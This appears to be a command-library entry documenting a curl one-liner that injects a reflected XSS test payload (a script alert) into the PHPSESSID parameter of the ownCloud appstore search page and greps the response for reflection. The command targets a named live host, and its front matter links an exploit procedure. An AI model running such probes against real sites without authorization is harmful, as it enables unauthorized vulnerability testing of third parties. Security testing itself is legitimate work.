---
id: cmd-curl-xss-owncloud-83381
data: >-
  curl
  "https://apps.owncloud.com/content/search.php?PHPSESSID=\"&gt;XSSHERE&lt;script&gt;alert(1)&lt;/script&gt;"
  | grep XSS
tags:
  - xss
  - testing
  - http-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T03:15:26.905Z'
verified: false
validated: true
submitted: true
---
# curl-reflected-xss-test-owncloud

## Command

```bash
curl "https://apps.owncloud.com/content/search.php?PHPSESSID=\"&gt;XSSHERE&lt;script&gt;alert(1)&lt;/script&gt;" | grep XSS
```

## Description

This command uses curl to send a GET request to the ownCloud appstore search endpoint with a malicious PHPSESSID parameter containing an XSS payload, then pipes the response to grep to search for the 'XSS' marker, verifying if the payload is reflected unescaped.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL (implicit in curl) | The target endpoint with injected payload: https://apps.owncloud.com/content/search.php?PHPSESSID="><XSSHERE<script>alert(1)</script> | Yes |
| grep pattern | Searches for 'XSS' in the output to confirm injection | Yes |

## Examples

### Basic Usage

```bash
curl "https://apps.owncloud.com/content/search.php?PHPSESSID=\"&gt;XSSHERE&lt;script&gt;alert(1)&lt;/script&gt;" | grep XSS
```

### Advanced Usage

```bash
curl -v "https://apps.owncloud.com/content/search.php?PHPSESSID=\"&gt;XSSHERE&lt;script&gt;alert(1)&lt;/script&gt;" | grep -i xss
```

> Adds verbose output (-v) for headers and case-insensitive grep (-i).

## Expected Output

If vulnerable, grep will output lines containing 'XSSHERE<script>alert(1)</script>', confirming the unescaped reflection. No output from grep indicates mitigation or non-vulnerability.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-in-ownCloud-Appstore-Search]]
